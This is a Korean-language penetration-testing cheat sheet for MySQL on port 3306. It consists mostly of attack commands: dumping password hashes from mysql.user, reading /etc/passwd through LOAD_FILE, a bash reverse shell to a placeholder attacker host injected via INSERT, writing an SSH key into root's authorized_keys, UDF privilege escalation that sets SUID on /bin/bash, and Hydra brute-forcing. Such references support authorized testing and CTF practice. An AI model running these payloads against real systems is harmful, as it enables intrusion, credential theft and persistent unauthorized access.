---
sidebar_position: 9
---

# MySQL - 3306

## 기본 정보

**포트**: 3306

MySQL은 오픈소스 관계형 데이터베이스 관리 시스템입니다.

## 연결

```bash
# 로컬 연결
mysql -u root -p

# 원격 연결
mysql -u <USERNAME> -h <RHOST> -p

# SSL 없이 연결
mysql -u <USERNAME> -h <RHOST> -p --skip-ssl
```

## 기본 명령어

```sql
-- 상태 확인
mysql> STATUS;

-- 데이터베이스 목록
mysql> SHOW databases;

-- 데이터베이스 선택
mysql> USE <DATABASE>;

-- 테이블 목록
mysql> SHOW tables;

-- 테이블 구조 확인
mysql> DESCRIBE <TABLE>;

-- 버전 확인
mysql> SELECT version();

-- 현재 사용자
mysql> SELECT system_user();

-- 테이블 내용 조회
mysql> SELECT * FROM Users;
mysql> SELECT * FROM users \G;
mysql> SELECT Username,Password FROM Users;

-- 특정 사용자 비밀번호 확인
mysql> SELECT user, authentication_string FROM mysql.user WHERE user = '<USERNAME>';

-- 권한 확인
mysql> SHOW GRANTS FOR '<USERNAME>'@'localhost' \G;
```

## 파일 읽기

```sql
-- Linux 파일 읽기
mysql> SELECT LOAD_FILE('/etc/passwd');

-- Windows 파일 읽기
mysql> SELECT LOAD_FILE('C:\\PATH\\TO\\FILE\\<FILE>');
```

## 사용자 비밀번호 변경

```sql
mysql> update user set password = '37b08599d3f323491a66feabbb5b26af' where user_id = 1;
```

## 쉘 실행

```sql
-- 시스템 쉘 실행
mysql> \! /bin/sh
```

## 코드 삽입 및 실행

```sql
-- 리버스 쉘 삽입
mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1')");
```

## SSH Key 작성

```sql
-- authorized_keys2에 SSH 공개키 작성
mysql> SELECT "<SSH_PUBLIC_KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
```

## Nmap

```bash
# MySQL 버전 확인
sudo nmap -p3306 -sV <RHOST>

# MySQL 정보 수집
sudo nmap -p3306 --script mysql-info <RHOST>

# MySQL 빈 비밀번호 확인
sudo nmap -p3306 --script mysql-empty-password <RHOST>

# MySQL 사용자 열거
sudo nmap -p3306 --script mysql-users --script-args mysqluser=<USERNAME>,mysqlpass=<PASSWORD> <RHOST>

# MySQL 데이터베이스 열거
sudo nmap -p3306 --script mysql-databases --script-args mysqluser=<USERNAME>,mysqlpass=<PASSWORD> <RHOST>

# MySQL 변수 확인
sudo nmap -p3306 --script mysql-variables --script-args mysqluser=<USERNAME>,mysqlpass=<PASSWORD> <RHOST>

# MySQL 감사
sudo nmap -p3306 --script mysql-audit --script-args mysql-audit.username=<USERNAME>,mysql-audit.password=<PASSWORD> <RHOST>
```

## UDF (User Defined Function) 권한 상승

```sql
-- lib_mysqludf_sys를 이용한 명령 실행
-- 먼저 UDF 라이브러리를 /usr/lib/mysql/plugin/에 업로드해야 함

mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/tmp/lib_mysqludf_sys.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
mysql> select sys_exec('chmod +s /bin/bash');
```

## Hydra 브루트포스

```bash
# MySQL 브루트포스
hydra -L users.txt -P passwords.txt <RHOST> mysql
hydra -l root -P passwords.txt <RHOST> mysql
```

## 참고

- FILE 권한 확인 (LOAD_FILE, INTO OUTFILE 사용 가능 여부)
- secure_file_priv 설정 확인
- root 권한으로 실행되는지 확인
- UDF를 통한 명령 실행
- 약한 자격증명 테스트
